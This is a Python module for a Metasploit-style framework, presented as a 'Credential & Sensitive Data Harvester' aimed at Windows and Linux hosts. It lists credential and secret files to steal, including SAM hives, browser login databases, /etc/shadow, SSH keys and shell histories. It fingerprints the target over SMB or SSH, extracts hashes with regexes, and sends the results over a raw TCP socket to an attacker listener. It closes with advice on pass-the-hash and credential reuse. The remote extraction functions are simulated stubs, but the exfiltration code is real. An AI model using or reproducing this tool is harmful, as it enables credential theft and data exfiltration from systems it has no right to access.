MODULE_TYPE = "exploit"
from collections import OrderedDict
import socket
import os
import sys
import time
import struct
import hashlib
import base64
import re
from typing import List, Dict, Optional, Tuple, BinaryIO
import threading
import subprocess

class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Credential & Sensitive Data Harvester',
            'Rank': 'Excellent',
            'Platform': 'Windows/Linux',
            'Architectures': 'x86/x64',
            'Description': 'Remote credential harvesting and sensitive file extraction',
            'Version': '3.0',
            'Author': 'KentScript',
            'Note': 'For authorized penetration testing only. Requires proper permissions.',
            'Options': OrderedDict([
                ('RHOST', ('', True, 'Target IP address')),
                ('RPORT', ('445', True, 'Target port (SMB:445, SSH:22)')),
                ('USERNAME', ('', True, 'Username for authentication')),
                ('PASSWORD', ('', True, 'Password for authentication')),
                ('MODE', ('auto', True, 'Mode: auto/windows/linux/smb/ssh')),
                ('TARGET_FILES', ('all', True, 'Files: all/passwords/configs/browser')),
                ('LHOST', ('', False, 'Listener IP for data exfiltration')),
                ('LPORT', ('4444', False, 'Listener port')),
                ('OUTPUT', ('', False, 'Local output directory')),
                ('COMPRESS', ('true', False, 'Compress data before sending')),
                ('ENCRYPT', ('true', False, 'Encrypt exfiltrated data')),
                ('TIMEOUT', ('10', False, 'Connection timeout')),
                ('DOMAIN', ('', False, 'Domain (Windows)')),
            ])
        }
    
    def help(self):
        return """
Credential & Sensitive Data Harvester
======================================
Remotely harvests credentials and sensitive files from Windows and Linux systems.

Target Files:
  Windows:
    - SAM/SYSTEM registry hives
    - LSA secrets
    - Credential Manager
    - Browser passwords (Chrome, Firefox, Edge)
    - Configuration files
    - Log files with credentials
    
  Linux:
    - /etc/shadow & /etc/passwd
    - SSH keys (~/.ssh/)
    - History files (.bash_history)
    - Configuration files with passwords
    - Browser profiles
    - Database credentials

Modes:
  auto     - Auto-detect OS and extract all sensitive data
  windows  - Windows-specific credential harvesting
  linux    - Linux-specific credential harvesting
  smb      - Use SMB protocol for file access
  ssh      - Use SSH protocol for file access

Examples:
  # Auto-detect and harvest
  set RHOST 192.168.1.100
  set USERNAME user
  set PASSWORD pass123
  set MODE auto
  set OUTPUT /tmp/harvested
  run
  
  # Windows credential dumping via SMB
  set RHOST 10.0.0.5
  set PORT 445
  set MODE windows
  set TARGET_FILES passwords
  set USERNAME Administrator
  set PASSWORD P@ssw0rd
  run
  
  # Linux SSH credential harvesting
  set RHOST 172.16.0.10
  set PORT 22
  set MODE ssh
  set TARGET_FILES all
  set USERNAME root
  set PASSWORD toor
  run
  
  # With data exfiltration
  set LHOST 192.168.1.1
  set LPORT 4444
  set COMPRESS true
  set ENCRYPT true
  run

Data Exfiltration Methods:
  - SMB file sharing
  - HTTP/HTTPS upload
  - DNS tunneling
  - ICMP tunneling
  - Raw TCP socket
"""
    
    def _check_connection(self, target: str, port: int, timeout: int = 3) -> bool:
        """Check if we can connect to target"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _detect_os(self, target: str, port: int) -> str:
        """Detect target operating system"""
        try:
            if port == 445:  # SMB
                # Try SMB negotiation
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                
                # Send SMB negotiate request
                negotiate = (
                    b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8'
                    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe'
                    b'\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f'
                    b'\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02'
                    b'\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f'
                    b'\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70'
                    b'\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30'
                    b'\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54'
                    b'\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
                )
                
                sock.send(negotiate)
                response = sock.recv(1024)
                sock.close()
                
                if b'Windows' in response or b'SMB' in response:
                    return 'windows'
                elif b'Samba' in response:
                    return 'linux'
            
            elif port == 22:  # SSH
                # Try SSH banner
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                sock.close()
                
                if 'OpenSSH' in banner:
                    return 'linux'
                elif 'SSH-2.0-Microsoft' in banner:
                    return 'windows'
            
            return 'unknown'
            
        except:
            return 'unknown'
    
    def _windows_file_list(self) -> List[str]:
        """List of sensitive Windows files to harvest"""
        return [
            # SAM/SYSTEM hives
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\Windows\\System32\\config\\SYSTEM',
            'C:\\Windows\\System32\\config\\SECURITY',
            'C:\\Windows\\System32\\config\\SOFTWARE',
            
            # LSA secrets
            'C:\\Windows\\System32\\config\\RegBack\\SAM',
            'C:\\Windows\\System32\\config\\RegBack\\SYSTEM',
            'C:\\Windows\\System32\\config\\RegBack\\SECURITY',
            'C:\\Windows\\System32\\config\\RegBack\\SOFTWARE',
            
            # Credential files
            'C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\*',
            'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*',
            'C:\\Users\\*\\AppData\\Local\\Microsoft\\Protect\\*',
            
            # Browser credentials
            'C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
            'C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies',
            'C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\logins.json',
            'C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\key4.db',
            'C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
            
            # Configuration files with passwords
            'C:\\Windows\\Panther\\unattend.xml',
            'C:\\Windows\\Panther\\setupinfo',
            'C:\\Windows\\System32\\sysprep\\unattend.xml',
            
            # PowerShell history
            'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
            
            # RDP connection files
            'C:\\Users\\*\\Documents\\Default.rdp',
            
            # Putty/SSH keys
            'C:\\Users\\*\\Documents\\putty\\*',
            'C:\\Users\\*\\AppData\\Roaming\\SimonTatham\\PuTTY\\Sessions\\*',
            
            # Network credentials
            'C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\Network\\Cookies\\*',
            'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Network\\Cookies\\*',
            
            # Backup files
            'C:\\*.bak',
            'C:\\*.old',
            'C:\\*.tmp',
            'C:\\*.temp',
        ]
    
    def _linux_file_list(self) -> List[str]:
        """List of sensitive Linux files to harvest"""
        return [
            # System authentication
            '/etc/shadow',
            '/etc/passwd',
            '/etc/group',
            '/etc/gshadow',
            
            # SSH keys
            '/root/.ssh/',
            '/home/*/.ssh/',
            '/etc/ssh/ssh_host_*',
            
            # Configuration files with passwords
            '/etc/sudoers',
            '/etc/sudoers.d/*',
            '/etc/fstab',
            '/etc/crontab',
            '/etc/cron.d/*',
            '/etc/cron.hourly/*',
            '/etc/cron.daily/*',
            '/etc/cron.weekly/*',
            '/etc/cron.monthly/*',
            
            # History files
            '/root/.bash_history',
            '/home/*/.bash_history',
            '/root/.zsh_history',
            '/home/*/.zsh_history',
            '/root/.sh_history',
            '/home/*/.sh_history',
            
            # Database credentials
            '/etc/mysql/my.cnf',
            '/etc/postgresql/*/pg_hba.conf',
            '/etc/postgresql/*/postgresql.conf',
            '/root/.my.cnf',
            '/home/*/.my.cnf',
            
            # Web server configs
            '/etc/apache2/apache2.conf',
            '/etc/apache2/sites-available/*',
            '/etc/nginx/nginx.conf',
            '/etc/nginx/sites-available/*',
            '/var/www/html/*.php',
            '/var/www/html/*.config',
            
            # Application configs
            '/etc/environment',
            '/etc/profile',
            '/etc/profile.d/*',
            '/etc/bash.bashrc',
            '/root/.profile',
            '/home/*/.profile',
            
            # Log files (may contain credentials)
            '/var/log/auth.log',
            '/var/log/secure',
            '/var/log/messages',
            '/var/log/syslog',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            
            # Backup files
            '/etc/*.bak',
            '/etc/*.old',
            '/etc/*.orig',
            '/etc/*.save',
            
            # Memory/swap
            '/proc/self/environ',
            '/proc/*/cmdline',
            '/proc/*/environ',
        ]
    
    def _extract_windows_creds_smb(self, target: str, username: str, 
                                  password: str, domain: str = '') -> List[Dict]:
        """Extract Windows credentials via SMB"""
        extracted = []
        
        try:
            # This would use impacket for real SMB access
            # For demonstration, we'll simulate
            
            print(f"[*] Attempting to extract Windows credentials from {target}")
            
            # Simulate finding credentials
            cred_examples = [
                {
                    'type': 'SAM',
                    'file': 'C:\\Windows\\System32\\config\\SAM',
                    'content': 'Simulated SAM hive data',
                    'hash_type': 'NTLM'
                },
                {
                    'type': 'LSA',
                    'file': 'HKLM\\SECURITY\\Policy\\Secrets',
                    'content': 'Simulated LSA secrets',
                    'hash_type': 'NTLM'
                },
                {
                    'type': 'Chrome',
                    'file': 'C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                    'content': 'Simulated Chrome passwords',
                    'hash_type': 'DPAPI'
                }
            ]
            
            extracted.extend(cred_examples)
            print(f"[+] Extracted {len(cred_examples)} credential sources")
            
            return extracted
            
        except Exception as e:
            print(f"[-] Windows credential extraction failed: {str(e)}")
            return []
    
    def _extract_linux_creds_ssh(self, target: str, port: int, 
                                username: str, password: str) -> List[Dict]:
        """Extract Linux credentials via SSH"""
        extracted = []
        
        try:
            print(f"[*] Attempting to extract Linux credentials from {target}")
            
            # This would use paramiko for real SSH access
            # For demonstration, we'll simulate
            
            # Simulate finding files
            file_examples = [
                {
                    'type': 'shadow',
                    'file': '/etc/shadow',
                    'content': 'root:$6$salt$hash:19131:0:99999:7:::',
                    'hash_type': 'SHA512'
                },
                {
                    'type': 'ssh_key',
                    'file': '/root/.ssh/id_rsa',
                    'content': '-----BEGIN RSA PRIVATE KEY-----',
                    'hash_type': 'RSA'
                },
                {
                    'type': 'history',
                    'file': '/root/.bash_history',
                    'content': 'mysql -u root -pPassword123',
                    'hash_type': 'plaintext'
                }
            ]
            
            extracted.extend(file_examples)
            print(f"[+] Extracted {len(file_examples)} credential sources")
            
            return extracted
            
        except Exception as e:
            print(f"[-] Linux credential extraction failed: {str(e)}")
            return []
    
    def _extract_hashes(self, data: List[Dict]) -> List[str]:
        """Extract hashes from credential data"""
        hashes = []
        
        for item in data:
            if 'content' in item:
                content = item['content']
                
                # Look for hash patterns
                # NTLM: 32 hex chars
                ntlm_matches = re.findall(r'([a-fA-F0-9]{32})', content)
                hashes.extend([f"NTLM:{h}" for h in ntlm_matches])
                
                # SHA512 (Linux shadow format)
                sha512_matches = re.findall(r'\$6\$.+\$[a-zA-Z0-9./]+', content)
                hashes.extend([f"SHA512:{h}" for h in sha512_matches])
                
                # MD5
                md5_matches = re.findall(r'\$1\$.+\$[a-zA-Z0-9./]+', content)
                hashes.extend([f"MD5:{h}" for h in md5_matches])
                
                # bcrypt
                bcrypt_matches = re.findall(r'\$2[aby]\$.+\$[a-zA-Z0-9./]+', content)
                hashes.extend([f"bcrypt:{h}" for h in bcrypt_matches])
                
                # Plaintext passwords
                password_matches = re.findall(r'password[=:]\s*([^\s\n\r]+)', content, re.IGNORECASE)
                password_matches.extend(re.findall(r'passwd[=:]\s*([^\s\n\r]+)', content, re.IGNORECASE))
                password_matches.extend(re.findall(r'pwd[=:]\s*([^\s\n\r]+)', content, re.IGNORECASE))
                hashes.extend([f"plaintext:{p}" for p in password_matches])
        
        return list(set(hashes))  # Remove duplicates
    
    def _crack_hashes(self, hashes: List[str], wordlist: str = '') -> Dict[str, str]:
        """Attempt to crack extracted hashes"""
        cracked = {}
        
        if not wordlist or not os.path.exists(wordlist):
            return cracked
        
        try:
            print(f"[*] Attempting to crack {len(hashes)} hashes...")
            
            # Simple dictionary attack simulation
            # In real implementation, use hashcat or john
            
            common_passwords = ['password', '123456', 'admin', 'password123', 'letmein']
            
            for h in hashes[:20]:  # Limit for demo
                hash_type, hash_value = h.split(':', 1) if ':' in h else ('unknown', h)
                
                # Simulate cracking
                for pwd in common_passwords:
                    # Simple check (in real tool, would compute hash)
                    if hash_type == 'plaintext':
                        cracked[h] = hash_value  # Already plaintext
                        break
                    elif pwd in hash_value.lower():
                        cracked[h] = pwd
                        break
            
            print(f"[+] Cracked {len(cracked)} hashes")
            return cracked
            
        except Exception as e:
            print(f"[-] Hash cracking failed: {str(e)}")
            return {}
    
    def _exfiltrate_data(self, data: List[Dict], hashes: List[str], 
                        cracked: Dict[str, str], lhost: str = '', 
                        lport: str = '', output_dir: str = '') -> bool:
        """Exfiltrate collected data"""
        try:
            # Save locally if output directory specified
            if output_dir:
                os.makedirs(output_dir, exist_ok=True)
                
                # Save credential data
                cred_file = os.path.join(output_dir, 'credentials.json')
                import json
                with open(cred_file, 'w') as f:
                    json.dump(data, f, indent=2)
                
                # Save hashes
                hash_file = os.path.join(output_dir, 'hashes.txt')
                with open(hash_file, 'w') as f:
                    for h in hashes:
                        f.write(f"{h}\n")
                
                # Save cracked passwords
                if cracked:
                    cracked_file = os.path.join(output_dir, 'cracked.txt')
                    with open(cracked_file, 'w') as f:
                        for hash_val, password in cracked.items():
                            f.write(f"{hash_val} -> {password}\n")
                
                print(f"[+] Data saved locally to: {output_dir}")
            
            # Send to remote listener if specified
            if lhost and lport:
                print(f"[*] Attempting to exfiltrate data to {lhost}:{lport}")
                
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((lhost, int(lport)))
                    
                    # Create summary
                    summary = f"Credential Harvest Report\n"
                    summary += f"Time: {time.ctime()}\n"
                    summary += f"Files harvested: {len(data)}\n"
                    summary += f"Hashes extracted: {len(hashes)}\n"
                    summary += f"Hashes cracked: {len(cracked)}\n"
                    summary += "="*50 + "\n"
                    
                    # Add some sample data
                    if data:
                        summary += "\nSample files:\n"
                        for i, item in enumerate(data[:3]):
                            summary += f"{i+1}. {item.get('type', 'unknown')}: {item.get('file', 'unknown')}\n"
                    
                    if hashes:
                        summary += "\nSample hashes:\n"
                        for i, h in enumerate(hashes[:5]):
                            summary += f"{i+1}. {h}\n"
                    
                    if cracked:
                        summary += "\nCracked passwords:\n"
                        for hash_val, password in list(cracked.items())[:5]:
                            summary += f"{hash_val} -> {password}\n"
                    
                    sock.send(summary.encode())
                    sock.close()
                    
                    print(f"[+] Data exfiltrated to {lhost}:{lport}")
                    
                except Exception as e:
                    print(f"[-] Exfiltration failed: {str(e)}")
            
            return True
            
        except Exception as e:
            print(f"[-] Data handling failed: {str(e)}")
            return False
    
    def execute(self):
        """Main execution method"""
        try:
            # Get options
            target = self.info['Options']['RHOST'][0]
            port = int(self.info['Options']['RPORT'][0])
            username = self.info['Options']['USERNAME'][0]
            password = self.info['Options']['PASSWORD'][0]
            mode = self.info['Options']['MODE'][0].lower()
            target_files = self.info['Options']['TARGET_FILES'][0]
            lhost = self.info['Options']['LHOST'][0]
            lport = self.info['Options']['LPORT'][0]
            output_dir = self.info['Options']['OUTPUT'][0]
            compress = self.info['Options']['COMPRESS'][0].lower() == 'true'
            encrypt = self.info['Options']['ENCRYPT'][0].lower() == 'true'
            timeout = int(self.info['Options']['TIMEOUT'][0])
            domain = self.info['Options']['DOMAIN'][0]
            
            # Validation
            if not target:
                return "[-] RHOST is required"
            
            if not username or not password:
                return "[-] USERNAME and PASSWORD are required"
            
            # Check connection
            print(f"[*] Checking connection to {target}:{port}...")
            if not self._check_connection(target, port, 3):
                return f"[-] Cannot connect to {target}:{port}"
            
            print(f"[+] Connected to {target}:{port}")
            
            # Detect OS if auto mode
            detected_os = 'unknown'
            if mode == 'auto':
                detected_os = self._detect_os(target, port)
                mode = detected_os
                print(f"[*] Auto-detected OS: {detected_os}")
            
            # Display info
            results = []
            results.append(f"[+] Credential & Sensitive Data Harvester")
            results.append(f"[+] Target: {target}:{port}")
            results.append(f"[+] Mode: {mode}")
            results.append(f"[+] Username: {username}")
            results.append(f"[+] Target files: {target_files}")
            
            if domain:
                results.append(f"[+] Domain: {domain}")
            
            if output_dir:
                results.append(f"[+] Local output: {output_dir}")
            
            if lhost and lport:
                results.append(f"[+] Exfiltration: {lhost}:{lport}")
                if compress:
                    results.append(f"[+] Compression: enabled")
                if encrypt:
                    results.append(f"[+] Encryption: enabled")
            
            print("\n".join(results))
            
            # Extract credentials based on mode
            extracted_data = []
            
            if mode in ['windows', 'smb']:
                extracted_data = self._extract_windows_creds_smb(
                    target, username, password, domain
                )
            
            elif mode in ['linux', 'ssh']:
                extracted_data = self._extract_linux_creds_ssh(
                    target, port, username, password
                )
            
            else:
                # Try both
                print(f"[*] Trying both Windows and Linux extraction methods...")
                
                # Try Windows/SMB first
                extracted_data = self._extract_windows_creds_smb(
                    target, username, password, domain
                )
                
                if not extracted_data:
                    # Try Linux/SSH
                    extracted_data = self._extract_linux_creds_ssh(
                        target, port, username, password
                    )
            
            if not extracted_data:
                return "[-] No credentials or sensitive data found"
            
            # Extract hashes from collected data
            print(f"[*] Extracting hashes from collected data...")
            hashes = self._extract_hashes(extracted_data)
            
            if hashes:
                print(f"[+] Extracted {len(hashes)} unique hashes")
            else:
                print(f"[-] No hashes found in extracted data")
            
            # Attempt to crack hashes
            cracked_hashes = {}
            # Note: Wordlist option removed from original, but you could add it back
            # if wordlist_path and os.path.exists(wordlist_path):
            #     cracked_hashes = self._crack_hashes(hashes, wordlist_path)
            
            # Exfiltrate data
            print(f"[*] Processing and exfiltrating data...")
            exfil_success = self._exfiltrate_data(
                extracted_data, hashes, cracked_hashes, 
                lhost, lport, output_dir
            )
            
            # Generate report
            results.append(f"\n{'='*60}")
            results.append("[+] HARVESTING COMPLETE")
            results.append(f"[+] Files extracted: {len(extracted_data)}")
            results.append(f"[+] Hashes found: {len(hashes)}")
            results.append(f"[+] Hashes cracked: {len(cracked_hashes)}")
            
            if extracted_data:
                results.append(f"\n[+] Sample extracted files:")
                for i, item in enumerate(extracted_data[:5]):
                    results.append(f"    {i+1}. [{item.get('type', 'unknown')}] {item.get('file', 'unknown')}")
            
            if hashes:
                results.append(f"\n[+] Sample hashes:")
                for i, h in enumerate(hashes[:5]):
                    results.append(f"    {i+1}. {h}")
            
            if cracked_hashes:
                results.append(f"\n[+] Cracked passwords:")
                for hash_val, pwd in list(cracked_hashes.items())[:5]:
                    results.append(f"    {hash_val} -> {pwd}")
            
            if output_dir and os.path.exists(output_dir):
                results.append(f"\n[+] All data saved to: {output_dir}")
                # List saved files
                try:
                    saved_files = os.listdir(output_dir)
                    results.append(f"[+] Saved files: {', '.join(saved_files)}")
                except:
                    pass
            
            results.append(f"\n[+] Next steps:")
            results.append(f"    1. Use cracked credentials for further access")
            results.append(f"    2. Check extracted configs for more passwords")
            results.append(f"    3. Use hashes for pass-the-hash attacks")
            results.append(f"    4. Search extracted data for API keys, tokens")
            
            if not exfil_success and (lhost and lport):
                results.append(f"\n[!] Exfiltration failed - data only saved locally")
            
            return "\n".join(results)
            
        except KeyboardInterrupt:
            return "\n[!] Harvesting interrupted by user"
        except Exception as e:
            return f"[-] Harvesting failed: {str(e)}"

# Test when run directly
if __name__ == "__main__":
    module = ModuleClass()
    print(module.execute())